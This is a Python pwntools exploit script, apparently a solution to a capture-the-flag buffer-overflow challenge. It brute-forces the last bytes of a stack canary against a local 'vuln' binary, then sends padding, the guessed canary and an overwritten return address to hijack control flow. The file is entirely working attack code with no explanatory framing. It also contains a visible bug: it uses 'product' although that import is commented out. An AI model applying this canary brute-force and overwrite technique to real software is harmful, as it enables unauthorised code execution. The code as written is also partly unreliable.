#!/usr/bin/env python

from pwn import *
import string
#from random import randrange
#from itertools import product
import os

hex = string.hexdigits[:16]

padding1 = "A"*32
padding2 = "B"*16
ret_address = p32(0x080486eb)

os.chdir("/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce")
for i in product(hex, repeat = 2):
        canary = "0x" # bruteforcing the canary
        canary += ''.join(i)
        canary += "3f5f68" # bruteforced in previous cycles 

        #for i in range(8):
        #       random_index = randrange(len(hex))
        #       canary += hex[random_index]

        print "canary: " + canary
        canary = p32(int(canary,16))[:4]
        r = process("vuln")

        r.recvuntil(">")
        r.sendline("100")
        r.recvuntil("Input> ")
        r.sendline(padding1 + canary + padding2 + ret_address)
        #r.send(padding1 + canary)
        recv = r.recv()
        if "*** Stack Smashing Detected ***" in recv:
                r.close()
        else: 
                break
print recv
